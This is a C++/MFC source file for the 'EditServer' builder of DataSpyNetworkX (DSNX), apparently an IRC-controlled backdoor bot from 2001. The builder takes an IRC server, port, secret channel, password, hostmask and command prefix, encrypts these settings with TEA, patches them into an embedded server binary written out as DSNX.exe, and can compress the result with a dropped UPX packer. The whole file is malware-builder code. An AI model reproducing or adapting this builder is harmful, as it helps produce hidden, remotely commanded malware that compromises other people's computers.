/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include "stdafx.h"
#include "EditServer.h"
#include "EditServerDlg.h"
#include "server.h"
#include "UPX.h"
#include "readme.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define r_CHANNEL 'c'
#define r_QUERY   'q'
#define r_NOTICE  'n'

char cRepTo = r_NOTICE;

BOOL Win2k()
{
	OSVERSIONINFO osvi;	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	
	if(GetVersionEx(&osvi)==FALSE) return FALSE;
	
	return ((osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) && (osvi.dwMajorVersion > 4) );
}

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	afx_msg void OnDontAgree();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	ON_BN_CLICKED(IDOK2, OnDontAgree)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CEditServerDlg dialog
//#include <winuser.h>
//#include <richedit.h>

CEditServerDlg::CEditServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CEditServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CEditServerDlg)
	m_Server = _T("localhost");
	m_Port = _T("6667");
	m_Channel = _T("#dsnx secret");
	m_Password = _T("password");
	m_Prefix = _T("#");
	m_PServer = TRUE;
	m_Hostmask = _T("*");//nickname!ident@*wave.on.home.com");
	m_Status = _T("+ DSNX EditServer Online (DataSpyNetworkX)\r\n");
	//}}AFX_DATA_INIT
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	

}

void CEditServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CEditServerDlg)
	DDX_Text(pDX, IDC_EDIT1, m_Server);
	DDX_Text(pDX, IDC_EDIT2, m_Port);
	DDV_MaxChars(pDX, m_Port, 5);
	DDX_Text(pDX, IDC_EDIT3, m_Channel);
	DDX_Text(pDX, IDC_EDIT4, m_Password);
	DDX_Text(pDX, IDC_EDIT5, m_Prefix);
	DDV_MaxChars(pDX, m_Prefix, 1);
	DDX_Check(pDX, IDC_CHECK2, m_PServer);
	DDX_Text(pDX, IDC_EDIT6, m_Hostmask);
	DDX_Text(pDX, IDC_STATUS, m_Status);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CEditServerDlg, CDialog)
	//{{AFX_MSG_MAP(CEditServerDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_RADIO1, OnChannel)
	ON_BN_CLICKED(IDC_RADIO2, OnQuery)
	ON_BN_CLICKED(IDC_RADIO3, OnNOTICE)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CEditServerDlg message handlers

//Transparency Shit From Miranda ICQ :P
#include <fcntl.h>
#define LWA_ALPHA 0x02
#define WS_EX_LAYERED 0x080000
typedef BOOL (WINAPI *TmySetLayeredWindowAttributes)(HWND hwnd, COLORREF crKey, BYTE bAlpha, DWORD dwFlags);
TmySetLayeredWindowAttributes mySetLayeredWindowAttributes;
#define ALPHAVAL 245

BOOL CEditServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	

	CAboutDlg dlg1;

	int nResponse1 = dlg1.DoModal();

	if (Win2k()) //Only windows 2000 plus plus supports
	{
		HMODULE			hUserDll;
		hUserDll = LoadLibrary("user32.dll");
		if (hUserDll) mySetLayeredWindowAttributes = (TmySetLayeredWindowAttributes)GetProcAddress(hUserDll, "SetLayeredWindowAttributes");
		HWND hwnd = m_hWnd;
		SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
		if (mySetLayeredWindowAttributes) mySetLayeredWindowAttributes(hwnd, RGB(255,0,0), ALPHAVAL, LWA_ALPHA);//(BYTE)opts.alpha
	}

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CEditServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CEditServerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

HCURSOR CEditServerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


void TEAEncrypt (const unsigned long *const v,unsigned long *const w,const unsigned long * const k)
{
   register unsigned long       y=v[0],z=v[1],sum=0,delta=0x9E3779B9,n=128;

   while(n-->0)
      {
      y += (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
      sum += delta;
      z += (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
      }

   w[0]=y; w[1]=z; 
}

int Random(int iLow, int iHigh) 
{ 
	return iLow + rand() % (iHigh - iLow);
}


char *RandomText(int iLength)
{
	char *cOutput = new char[iLength + 1];

	for (int i = 0; i < iLength; i++)	
		cOutput[i] = Random(1,225);

	cOutput[iLength] = '\0';

	return cOutput;
	
}

#include <stdio.h>
#define MAX_DATA_LEN 128
void CEditServerDlg::OnOK() 
{
//
//Initalisation
//	
	UpdateData(TRUE);	
	srand((unsigned)time(NULL));
	char cSplit = 'ç';

	//char *ct[7] = { "ç\0","è\0","é\0","ê\0","ë\0","ì\0","í\0" };
	
	char *cTemp = new char[MAX_DATA_LEN*2],*cStatus = new char[MAX_DATA_LEN*2];

int iPort = lstrlen( m_Port     ),
	iChan = lstrlen( m_Channel  ),
	iServ = lstrlen( m_Server   ),
	iPass = lstrlen( m_Password ),
	iPrfx = lstrlen( m_Prefix   ),
	iHost = lstrlen( m_Hostmask ),
	iLen = iPort + iChan + iServ + iPass + iPrfx + iHost;
	
	if (iLen > MAX_DATA_LEN - 9)
	{
		//Mofos have made all the shit too long
		sprintf(cStatus,"Aborting build: User data to long: %i bytes over\r\n",iLen-(MAX_DATA_LEN -9));
		m_Status += _T(cStatus); UpdateData(FALSE);
		return;
	}
	sprintf(cStatus,"Building DSNX with %i bytes of user data\r\n",iLen+1);
	m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);

	
	//port channel server password hostmask prefix replytochan
	*cTemp =0;
	char cc[] = "%s%c\0";
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	//First Split
	strcat(cTemp,m_Port);				//Port
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	
	strcat(cTemp,m_Channel);			//Channel
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	
	strcat(cTemp,m_Server);				//Server
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	
	strcat(cTemp,m_Password);			//Password
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	
	strcat(cTemp,m_Hostmask);			//Hostmask
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	
	sprintf(cTemp,cc,cTemp,m_Prefix[0]);		//Prefix
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	
	sprintf(cTemp,cc,cTemp,cRepTo);			//Reply To
	sprintf(cTemp,cc,cTemp,cSplit);cSplit++;	//Last Split
	

	int iTemp = lstrlen(cTemp),iRoll = iTemp %2;

	if (iTemp > MAX_DATA_LEN) 
	{
		sprintf(cStatus,"Aborting build: ERROR:1 - (BUG)\0");
		m_Status += _T(cStatus); UpdateData(FALSE);
		return;
	}

	iTemp = MAX_DATA_LEN - iTemp; 	
	char *cTemp1 = new char[MAX_DATA_LEN *2]; *cTemp1=0;
	strcat(cTemp1,RandomText(iTemp /2 +iRoll));
	strcat(cTemp1,cTemp);
	delete cTemp;
	strcat(cTemp1,RandomText(iTemp /2));
	cTemp = cTemp1;
	
//
// Generate the key
//
//	sprintf(cStatus,"Generating Encryption Key\r\n");
//	m_Status += _T(cStatus); UpdateData(FALSE);
	unsigned long s_Key[4] = {0,0,0,0};
	int coo=0;

	for (int ia =0; ia < 4; ia++)
	{
		coo = Random(0,65535);
		for (int ib=0;ib<coo;ib++)
		{
			s_Key[ia] += Random(0,65535);
		}
	}
	unsigned long cool = lstrlen(cTemp1);
//
//Encrypt The Settings
// 
	sprintf(cStatus,"Encrypting User Data\r\n");
	m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);

	BYTE l[8],r[8];	int i=0,z=0,iReadLen=0;

	int iEncLen = lstrlen(cTemp1);
	

	while (iEncLen > 8) 
	{
		iEncLen -= 8;
		for (i =0; i < 8; i++)
		{
			l[i] = cTemp1[i + iReadLen];
		}
			TEAEncrypt((unsigned long*)l,(unsigned long*)r,s_Key);
		for (i=0; i < 8; i++)
		{
			cTemp1[i + iReadLen] = r[i];
		}
		iReadLen+=8;
	}
/*
//
// Generate the key (New nicks)
//
	unsigned long Ns_Key[4] = {0,0,0,0};
	coo=0;

	for (ia =0; ia < 4; ia++)
	{
		coo = Random(0,65535);
		for (int ib=0;ib<coo;ib++)
		{
		(unsigned long) Ns_Key[ia] += Random(0,65535);
		}
	}
//
//Encrypt The (nicks)
// 
	i=0;z=0;iReadLen=0;

	iEncLen = 3304;
	while (iEncLen >= 8) 
	{
		iEncLen -= 8;
		for (i =0; i < 8; i++)
		{
			l[i] = UnEncNicks[i + iReadLen];
		}
			TEAEncrypt((unsigned long*)l,(unsigned long*)r,Ns_Key);
		for (i=0; i < 8; i++)
		{
			UnEncNicks[i + iReadLen] = r[i];
		}
		iReadLen+=8;
	}
	*/
//
//WriteFileToDisk
//
	float iOriginal=0,iPack=0;
	char cServerName[] = "DSNX.exe\0";
	
	FILE *fout;
	if((fout = fopen(cServerName,"wb")) == NULL)
	{
		sprintf(cStatus,"Aborting Build: Error opening output file: %s\r\n",cServerName);
		m_Status += _T(cStatus); UpdateData(FALSE);
		return;
	}
	sprintf(cStatus,"Writing %s to disk\r\n",cServerName);
	m_Status += _T(cStatus); UpdateData(FALSE);Sleep(1);

	fwrite(DSNX,DSNX_LEN,1,fout); //write server
	
	fseek(fout,68716,SEEK_SET); //Settings
	fwrite(cTemp1,cool,1,fout);
	
	fseek(fout,68848,SEEK_SET);
	fwrite(&cool,sizeof(unsigned long),1,fout); //Length of encryption

	fseek(fout,68852,SEEK_SET); //Two more than you expect!!
	fwrite(&s_Key,16,1,fout); //Key

/*	fseek(fout,67144,SEEK_SET);  //encrypted nicks (2wices)
	fwrite(&UnEncNicks,3304,1,fout); 
	
	fseek(fout,67128,SEEK_SET);  //encrypted nicks Key
	fwrite(&Ns_Key,16,1,fout); 
*/
	fseek(fout,0,SEEK_END);
	iOriginal = ftell(fout);

fclose(fout);

if (m_PServer) 
{
	if((fout = fopen("upxd.exe","wb")) == NULL)
	{
		sprintf(cStatus,"Aborting build: ERROR:2 - (BUG)\0");
		m_Status += _T(cStatus); UpdateData(FALSE);
		return;
	}

	fwrite(UPX,UPXLen,1,fout);
	fclose(fout);

	sprintf(cStatus,"upxd.exe -9 %s\0",cServerName);

	WinExec(cStatus,SW_SHOW);
	
	while(remove("upxd.exe") == -1);
	
	FILE *fpack;
	if((fpack = fopen(cServerName,"r")) == NULL)
	{
		sprintf(cStatus,"Couln't get packed server size *Shrug*\r\n");
		m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);
	}
	else
	{
		fseek(fpack,0,SEEK_END);
		iPack=ftell(fpack);
		fclose(fpack);
	}
float iPcent = iPack/iOriginal;

	sprintf(cStatus,"%s packed %i bytes to %i bytes. %i percent.\r\n",cServerName,(int)iOriginal,(int)iPack,(int)(iPcent*100));
}
else		
	sprintf(cStatus,"Finnished build: %s, %i bytes\r\n",cServerName,(int)iOriginal);

	m_Status += _T(cStatus); UpdateData(FALSE);
	

	return;
}

void CAboutDlg::OnDontAgree() 
{
	exit(1);
}

void CEditServerDlg::OnChannel() //Sets reply to channel
{
cRepTo = r_CHANNEL;
	
}

void CEditServerDlg::OnQuery() 
{
	cRepTo = r_QUERY;
	
}

void CEditServerDlg::OnNOTICE() 
{
cRepTo = r_NOTICE;	
}
